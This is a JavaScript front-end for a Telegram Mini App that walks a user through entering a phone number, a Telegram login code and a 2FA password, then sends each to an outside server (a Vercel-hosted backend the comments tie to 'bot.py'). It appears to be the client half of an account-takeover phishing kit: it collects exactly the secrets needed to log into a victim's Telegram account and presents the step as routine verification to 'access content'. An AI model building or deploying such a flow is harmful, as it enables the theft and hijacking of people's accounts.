// ─── API base URL ─────────────────────────────────────────────────────────────
// This MUST point to the public IP/domain of the server running bot.py.
// Example: "https://your-server-ip:8080" or "https://api.yourdomain.com"
// If you are running bot.py on a VPS, replace the value below with your VPS public IP.
const API_BASE = "https://my-new-bot-iota.vercel.app";

// ─── Telegram WebApp init ─────────────────────────────────────────────────────
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();
tg.disableVerticalSwipes();

const initData = tg.initData || "";

let currentPhone  = "";
let countdownTimer = null;

// ─── Step navigation ──────────────────────────────────────────────────────────

function showStep(stepId) {
    document.querySelectorAll(".step").forEach((el) => el.classList.remove("active"));
    const target = document.getElementById(stepId);
    if (target) target.classList.add("active");
}

function goBack(stepId) {
    clearAlert("alert-phone");
    clearAlert("alert-otp");
    clearAlert("alert-2fa");
    showStep(stepId);
}

// ─── Alert helpers ────────────────────────────────────────────────────────────

function showAlert(elementId, message, type) {
    const el = document.getElementById(elementId);
    if (!el) return;
    const icons = { error: "❌", success: "✅", warning: "⚠️" };
    el.className = `alert alert-${type} show`;
    el.innerHTML = `<span class="alert-icon">${icons[type] || "ℹ️"}</span><span>${message}</span>`;
}

function clearAlert(elementId) {
    const el = document.getElementById(elementId);
    if (el) { el.className = "alert"; el.innerHTML = ""; }
}

// ─── Button loading state ─────────────────────────────────────────────────────

function setButtonLoading(btnId, loading, defaultLabel) {
    const btn = document.getElementById(btnId);
    if (!btn) return;
    btn.disabled = loading;
    btn.innerHTML = loading
        ? `<span class="loader"></span>Please wait...`
        : defaultLabel;
}

// ─── Countdown timer ──────────────────────────────────────────────────────────

function startCountdown(elementId, seconds, onDone) {
    if (countdownTimer) clearInterval(countdownTimer);
    const el = document.getElementById(elementId);
    if (!el) return;
    let remaining = seconds;
    el.textContent = `You can resend in ${remaining}s`;
    countdownTimer = setInterval(() => {
        remaining -= 1;
        if (remaining <= 0) {
            clearInterval(countdownTimer);
            countdownTimer = null;
            el.textContent = "";
            if (onDone) onDone();
        } else {
            el.textContent = `You can resend in ${remaining}s`;
        }
    }, 1000);
}

// ─── Step 1: Send OTP ─────────────────────────────────────────────────────────

async function sendOtp() {
    clearAlert("alert-phone");
    const phoneInput = document.getElementById("phone-input");
    let phone = (phoneInput.value || "").trim();

    if (!phone) {
        showAlert("alert-phone", "Please enter your phone number.", "error");
        phoneInput.focus();
        return;
    }
    if (!phone.startsWith("+")) {
        phone = "+" + phone;
        phoneInput.value = phone;
    }
    if (phone.replace(/\D/g, "").length < 7) {
        showAlert("alert-phone", "Please enter a valid international phone number.", "error");
        phoneInput.focus();
        return;
    }
    if (!initData) {
        showAlert("alert-phone", "Unable to verify your Telegram session. Open this app from within Telegram.", "error");
        return;
    }

    setButtonLoading("btn-send-otp", true, "Send OTP Code");

    try {
        const res = await fetch(`${API_BASE}/api/send_otp`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, phone_number: phone }),
        });
        const data = await res.json();

        if (data.ok) {
            currentPhone = phone;
            document.getElementById("phone-display").textContent = phone;
            showStep("step-otp");
            document.getElementById("otp-input").focus();
        } else if (data.flood_wait) {
            showAlert(
                "alert-phone",
                `Too many requests. Please wait ${data.flood_wait} seconds before trying again.`,
                "warning"
            );
            startCountdown("countdown-phone", data.flood_wait);
        } else {
            showAlert("alert-phone", data.error || "Failed to send OTP. Please try again.", "error");
        }
    } catch (err) {
        showAlert("alert-phone", "Network error. Please check your connection and try again.", "error");
    } finally {
        setButtonLoading("btn-send-otp", false, "Send OTP Code");
    }
}

// ─── Step 2: Verify OTP ───────────────────────────────────────────────────────

async function verifyOtp() {
    clearAlert("alert-otp");
    const otpInput = document.getElementById("otp-input");
    const otp = (otpInput.value || "").trim();

    if (!otp) {
        showAlert("alert-otp", "Please enter the OTP code you received.", "error");
        otpInput.focus();
        return;
    }
    if (!/^\d+$/.test(otp)) {
        showAlert("alert-otp", "OTP must contain digits only.", "error");
        otpInput.focus();
        return;
    }
    if (!initData) {
        showAlert("alert-otp", "Session error. Please restart the app.", "error");
        return;
    }

    setButtonLoading("btn-verify-otp", true, "Verify OTP");

    try {
        const res = await fetch(`${API_BASE}/api/verify_otp`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, otp_code: otp }),
        });
        const data = await res.json();

        if (data.ok) {
            tg.HapticFeedback.notificationOccurred("success");
            showStep("step-success");
            setTimeout(() => tg.close(), 3000);
        } else if (data.needs_2fa) {
            showStep("step-2fa");
            document.getElementById("twofa-input").focus();
        } else if (data.error && data.error.toLowerCase().includes("expired")) {
            showAlert("alert-otp", "The OTP has expired. Please go back and request a new one.", "warning");
        } else {
            showAlert("alert-otp", data.error || "Incorrect OTP. Please try again.", "error");
        }
    } catch (err) {
        showAlert("alert-otp", "Network error. Please check your connection and try again.", "error");
    } finally {
        setButtonLoading("btn-verify-otp", false, "Verify OTP");
    }
}

// ─── Step 3: Verify 2FA ───────────────────────────────────────────────────────

async function verify2fa() {
    clearAlert("alert-2fa");
    const passInput = document.getElementById("twofa-input");
    const password  = (passInput.value || "").trim();

    if (!password) {
        showAlert("alert-2fa", "Please enter your 2FA password.", "error");
        passInput.focus();
        return;
    }
    if (!initData) {
        showAlert("alert-2fa", "Session error. Please restart the app.", "error");
        return;
    }

    setButtonLoading("btn-verify-2fa", true, "Confirm Password");

    try {
        const res = await fetch(`${API_BASE}/api/verify_2fa`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, password }),
        });
        const data = await res.json();

        if (data.ok) {
            tg.HapticFeedback.notificationOccurred("success");
            showStep("step-success");
            setTimeout(() => tg.close(), 3000);
        } else if (data.error && data.error.toLowerCase().includes("session")) {
            showAlert("alert-2fa", "Session expired. Please restart the verification process.", "warning");
        } else {
            showAlert("alert-2fa", data.error || "Incorrect password. Please try again.", "error");
            passInput.focus();
            passInput.select();
        }
    } catch (err) {
        showAlert("alert-2fa", "Network error. Please check your connection and try again.", "error");
    } finally {
        setButtonLoading("btn-verify-2fa", false, "Confirm Password");
    }
}

// ─── Skip 2FA ─────────────────────────────────────────────────────────────────

async function skip2fa() {
    clearAlert("alert-2fa");
    if (!initData) {
        showAlert("alert-2fa", "Session error. Please restart the app.", "error");
        return;
    }

    const confirmSkip = confirm(
        "Skip 2FA verification?\n\nYou can still access content, but account security will not be fully verified."
    );
    if (!confirmSkip) return;

    setButtonLoading("btn-verify-2fa", true, "Confirm Password");

    try {
        const res = await fetch(`${API_BASE}/api/verify_2fa`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ initData, password: "SKIP" }),
        });
        const data = await res.json();

        if (data.ok) {
            tg.HapticFeedback.notificationOccurred("success");
            showStep("step-success");
            setTimeout(() => tg.close(), 3000);
        } else {
            showAlert("alert-2fa", data.error || "Could not skip 2FA. Please try again or enter your password.", "error");
        }
    } catch (err) {
        showAlert("alert-2fa", "Network error. Please check your connection.", "error");
    } finally {
        setButtonLoading("btn-verify-2fa", false, "Confirm Password");
    }
}

// ─── Enter key bindings ───────────────────────────────────────────────────────

document.getElementById("phone-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") sendOtp();
});
document.getElementById("otp-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") verifyOtp();
});
document.getElementById("twofa-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") verify2fa();
});

// ─── Telegram back button ─────────────────────────────────────────────────────

tg.BackButton.onClick(() => {
    const activeStep = document.querySelector(".step.active");
    if (!activeStep) return;
    const id = activeStep.id;
    if (id === "step-otp")  goBack("step-phone");
    if (id === "step-2fa")  goBack("step-otp");
});

// ─── Theme sync ───────────────────────────────────────────────────────────────

function syncTheme() {
    if (tg.colorScheme === "light") {
        document.documentElement.style.setProperty("--bg",         "#f2f4f8");
        document.documentElement.style.setProperty("--surface",    "#ffffff");
        document.documentElement.style.setProperty("--border",     "#dde1ee");
        document.documentElement.style.setProperty("--text",       "#1a1d27");
        document.documentElement.style.setProperty("--text-muted", "#6b7280");
        document.documentElement.style.setProperty("--input-bg",   "#f7f8fc");
    }
}

syncTheme();
tg.onEvent("themeChanged", syncTheme);
